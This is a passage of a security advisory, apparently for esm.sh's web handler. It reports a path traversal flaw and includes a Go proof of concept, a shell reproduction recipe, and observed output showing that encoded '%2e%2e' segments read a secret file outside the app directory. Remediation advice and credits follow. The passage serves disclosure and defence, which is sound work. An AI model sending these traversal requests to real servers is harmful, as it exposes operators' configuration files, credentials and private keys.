    mux := http.NewServeMux()
    mux.Handle("GET /", web.NewHandler(web.Config{AppDir: os.Args[1], Dev: false}))
    for _, target := range []string{
        "http://example/%2e%2e/%2e%2e/%2e%2e/secret.txt",
        "http://example/secret.txt",
    } {
        rr := httptest.NewRecorder()
        req := httptest.NewRequest("GET", target, nil)
        mux.ServeHTTP(rr, req)
        fmt.Printf("%s => status=%d location=%q contains_secret=%v body=%q\n",
            target,
            rr.Code,
            rr.Header().Get("Location"),
            strings.Contains(rr.Body.String(), "ancestor-secret-marker"),
            rr.Body.String(),
        )
    }
}
```

Maintainer-runnable clean-checkout recipe:

```sh
tmp=$(mktemp -d)
mkdir -p "$tmp/root/a/b/app"
printf 'ancestor-secret-marker' > "$tmp/root/secret.txt"
printf '<h1>inside</h1>' > "$tmp/root/a/b/app/index.html"
cat > "$tmp/poc.go" <<'EOF'
[place the PoC above here]
EOF
go run "$tmp/poc.go" "$tmp/root/a/b/app"
rm -rf "$tmp"
```

Observed vulnerable output in this environment:

```text
http://example/%2e%2e/%2e%2e/%2e%2e/secret.txt => status=200 location="" contains_secret=true body="ancestor-secret-marker"
http://example/secret.txt => status=200 location="" contains_secret=false body="<h1>inside</h1>"
```

Final re-check after drafting reproduced the same output:

```text
http://example/%2e%2e/%2e%2e/%2e%2e/secret.txt => status=200 location="" contains_secret=true body="ancestor-secret-marker"
http://example/secret.txt => status=200 location="" contains_secret=false body="<h1>inside</h1>"
```

Additional parser/control evidence observed locally:

```text
http://example/../secret.txt => status=307 loc="/secret.txt"
handler Path="/../secret.txt" RawPath="/%2e%2e/secret.txt"
http://example/%2e%2e/secret.txt => status=204 loc=""
http://example/a/../../secret.txt => status=307 loc="/secret.txt"
```

This confirms that the documented `ServeMux` setup redirects plain traversal paths but lets encoded dot-segments reach the handler.

### Impact

An unauthenticated remote attacker can read files that are outside the configured web application directory but readable by the server process. Depending on deployment layout and process privileges, this can disclose source files, configuration files, environment-adjacent files, build artifacts, local credentials, private keys, or other application secrets located in ancestor or sibling directories.

The impact is limited to file disclosure in the confirmed path. No write primitive or code execution was confirmed in this audit.

### Suggested remediation

Normalize request paths into a cleaned relative path before joining them with `AppDir`, and reject any path that is not local. A robust pattern is:

- reject paths containing NUL bytes,
- use `path.Clean("/" + r.URL.EscapedPath())` or an equivalent URL-path canonicalization step,
- trim the leading slash and reject non-local paths with `filepath.IsLocal`,
- join only the validated relative path to `AppDir`,
- optionally compare absolute cleaned paths to ensure the result remains inside the absolute app root,
- consider symlink policy explicitly if symlinks inside `AppDir` should not escape the app root.

Add regression tests for `/%2e%2e/secret.txt`, multi-level encoded traversal, plain `/../` behavior, and normal in-app file serving.

### Credits
- Thai Son Dinh from VinSOC Labs (R&D)

- https://github.com/esm-dev/esm.sh/pull/1376 [WEB]
- https://github.com/esm-dev/esm.sh/commit/468b6b2a4b4dfec334cf6b33b01fcd4e5cd93bed [WEB]
- https://github.com/esm-dev/esm.sh/commit/fc3b345e73aeaa0b7a05b6f27d91c05fdf5f9b53 [WEB]
- https://github.com/esm-dev/esm.sh [PACKAGE]
- https://github.com/esm-dev/esm.sh/releases/tag/v0.2.0 [WEB]
